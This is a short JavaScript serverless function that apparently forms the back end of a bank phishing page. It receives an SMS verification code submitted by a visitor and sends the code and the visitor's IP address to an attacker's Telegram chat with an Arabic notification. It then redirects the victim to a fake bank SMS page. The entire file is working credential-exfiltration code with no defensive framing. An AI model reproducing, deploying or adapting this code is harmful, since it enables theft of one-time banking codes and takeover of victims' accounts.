const axios = require('axios');

exports.handler = async function(event) {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const params = new URLSearchParams(event.body);
        const sms_code = params.get('sms') || 'N/A';
        const user_ip = event.headers['client-ip'] || 'N/A';

        const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

        const message = `تم استلام رمز تحقق جديد (SMS):\n\nالرمز: ${sms_code}\nIP: ${user_ip}`;

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            await axios.post(url, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
            });
        }

        return {
            statusCode: 302,
            headers: {
                'Location': '/bank_select/banks/sms.html', 
            },
        };
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: `Error: ${error.message}`,
        };
    }
};
